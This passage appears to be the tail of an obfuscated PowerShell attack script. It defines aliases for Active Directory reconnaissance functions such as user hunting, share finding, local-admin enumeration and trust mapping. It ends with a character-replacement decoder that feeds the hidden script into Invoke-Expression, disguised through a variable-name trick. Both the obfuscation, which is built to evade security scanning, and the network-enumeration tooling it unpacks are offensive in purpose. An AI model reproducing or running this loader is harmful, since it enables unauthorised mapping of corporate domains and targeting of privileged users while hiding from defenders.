Set-Alias Get-CachedRDPConnection Get-WMIRegCachedRDPConnection
Set-Alias Get-RegistryMountedDrive Get-WMIRegMountedDrive
Set-Alias Get-NetProcess Get-WMIProcess
Set-Alias Invoke-ThreadedFunction New-ThreadedFunction
Set-Alias Invoke-UserHunter Find-DomainUserLo'+'cation
Set-Alias Invoke-ProcessHunter Find-DomainProcess
Set-Alias Invoke-EventHunter Find-DomainUserEvent
Set-Alias Invoke-ShareFinder Find-DomainShare
Set-Alias Invoke-FileFinder Find-InterestingDomainShareFile
Set-Alias Invoke-EnumerateLocalAdmin Find-DomainLocalGroupMember
Set-Alias Get-NetDomainTrust Get-DomainTrust
Set-Alias Get-NetForestTrust Get-ForestTrust
Set-Alias Find-ForeignUser Get-DomainForeignUser
Set-Alias Find-ForeignGroup Get-DomainForeignGroupMember
Set-Alias Invoke-MapDomainTrust Get-DomainTrustMapping
Set-Alias Get-DomainPolicy Get-DomainPolicyData
').rePLACe('gIF1','$').rePLACe('41a',[StrinG][ChaR]39).rePLACe('2dO',[StrinG][ChaR]96).rePLACe(([ChaR]89+[ChaR]119+[ChaR]87),'\').rePLACe(([ChaR]90+[ChaR]102+[ChaR]114),[StrinG][ChaR]34).rePLACe(([ChaR]85+[ChaR]57+[ChaR]66),'|') | .((VaRiaBLE '*mdr*').NaME[3,11,2]-joiN'')
